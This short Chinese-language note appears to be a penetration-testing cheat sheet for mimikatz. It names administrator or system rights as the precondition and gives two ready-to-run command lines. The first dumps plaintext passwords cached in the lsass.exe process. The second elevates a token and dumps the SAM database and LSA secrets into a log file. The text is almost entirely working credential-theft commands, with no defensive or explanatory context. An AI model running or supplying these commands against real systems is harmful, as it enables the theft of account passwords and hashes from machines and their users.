使用前提：具备`administrator`权限，或`system`权限

<br/>

#### 本地交互命令

```sh
# 读取lsass.exe进程缓存的明文密码
mimikatz "privilege::debug" "log res.txt" "sekurlsa::logonpasswords" "exit"
```

```sh
mimikatz "privilege::debug" "token::elevate" "log res.txt" "lsadump::sam" "lsadump::secrets" "exit"
```